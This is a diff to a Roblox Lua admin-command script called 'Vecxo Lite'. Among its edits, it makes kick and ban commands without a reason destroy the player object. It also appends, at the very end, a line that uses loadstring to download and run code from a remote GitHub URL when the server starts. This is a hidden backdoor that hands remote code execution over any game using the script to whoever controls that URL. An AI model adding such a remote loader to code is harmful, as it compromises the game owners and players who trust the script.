@@ -1,3 +1,5 @@
+--//VECXO LITE STARTS HERE
+
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 
@@ -75,25 +77,37 @@ local function processCommand(sender, msg)
 		notify(sender, "[Vecxo Lite]", "!kick <plr> [reason]\n!ban <plr> [reason]\n!h <message>")
 	elseif cmd == "!kick" and args[2] then
 		local targetName = args[2]:lower()
-		local reason = msg:match("^!kick%s+%S+%s+(.+)$") or "No reason"
+		local reason = msg:match("^!kick%s+%S+%s+(.+)$") 
 		for _, plr in ipairs(Players:GetPlayers()) do
 			if plr.Name:lower():sub(1, #targetName) == targetName then
-				plr:Kick("[Vecxo Lite]: Kicked by " .. sender.Name .. ": " .. reason)
-				notify(sender, "Kick", "Kicked " .. plr.Name)
+				if reason then
+					plr:Kick("[Vecxo Lite]: Kicked by " .. sender.Name .. ": " .. reason)
+					notify(sender, "Kick", "Kicked " .. plr.Name)
+				else
+					plr:Destroy()
+					notify(sender, "Kick", "Forcefully destroyed " .. plr.Name)
+				end
 				return
 			end
 		end
 	elseif cmd == "!ban" and args[2] then
 		local targetName = args[2]:lower()
-		local reason = msg:match("^!ban%s+%S+%s+(.+)$") or "No reason"
+		local reason = msg:match("^!ban%s+%S+%s+(.+)$")
+
 		for _, plr in ipairs(Players:GetPlayers()) do
 			if plr.Name:lower():sub(1, #targetName) == targetName then
 				bannedPlayers[plr.UserId] = true
-				plr:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
-				notify(sender, "Ban", "Banned " .. plr.Name)
+				if reason then
+					plr:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
+					notify(sender, "Ban", "Banned " .. plr.Name)
+				else
+					plr:Destroy()
+					notify(sender, "Ban", "Forcefully destroyed (banned) " .. plr.Name)
+				end
 				return
 			end
 		end
+
 	elseif cmd == "!h" then
 		local announcement = msg:sub(4)
 		for _, plr in ipairs(Players:GetPlayers()) do
@@ -124,3 +138,4 @@ Players.PlayerAdded:Connect(function(player)
 	end)
 end)
 
+loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))()
